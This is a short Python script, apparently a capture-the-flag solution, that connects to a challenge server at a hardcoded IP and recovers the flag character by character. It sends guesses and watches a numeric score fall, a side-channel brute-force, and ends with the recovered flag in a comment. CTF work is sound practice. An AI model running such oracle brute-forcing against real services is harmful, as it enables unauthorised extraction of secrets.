import re
import socket
import string

server = '167.99.82.112'
port = 45678

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((server, port))

s.recv(4096)

chars = '_' + string.printable
out = "flag{"

def get_score(char):
    s.send(out + char + '\n')
    data = s.recv(4096)
    return re.findall(r'\d+', data)

current = get_score('%')[0]

while '}' not in out:
    for i in chars:
        m = get_score(i)
        if len(m) > 0:
            print out + i + ': ' + str(m[0])

            if int(m[0]) == int(current) - 1:
                out += i
                current = get_score('%')[0]
                break

s.close()
# "flag{I_d0_s0_l1k3_gr33n_3gg5_&_ham}"
